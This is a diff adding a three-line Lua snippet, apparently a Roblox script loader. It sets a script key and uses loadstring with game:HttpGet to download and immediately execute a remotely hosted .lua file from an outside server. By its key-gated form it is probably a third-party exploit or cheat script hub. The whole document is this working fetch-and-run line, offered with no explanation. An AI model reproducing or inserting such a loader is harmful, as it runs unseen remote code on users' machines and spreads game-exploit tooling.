@@ -1,0 +1,3 @@
+script_key = "aanvv2wvvjrjag4ymhpntgsm"
+
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/92676312461547be00d8a90948c58c6c5efd33b3911545656aa5850dbaae8417.lua"))()
